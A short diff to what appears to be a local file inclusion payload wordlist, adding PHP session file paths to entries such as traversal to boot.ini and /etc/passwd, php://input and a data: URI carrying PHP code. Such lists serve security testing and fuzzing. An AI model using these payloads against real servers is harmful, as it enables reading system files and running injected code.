@@ -31,3 +31,7 @@ c:/../../../boot.ini
 /etc/passwd/./././
 php://input
 data:,<? echo "yay"; ?>
+/tmp/sess_012345678
+/wamp/tmp/sess_012345678
+/var/lib/php5/sess_012345678
+/var/lib/php/sessions/sess_012345678
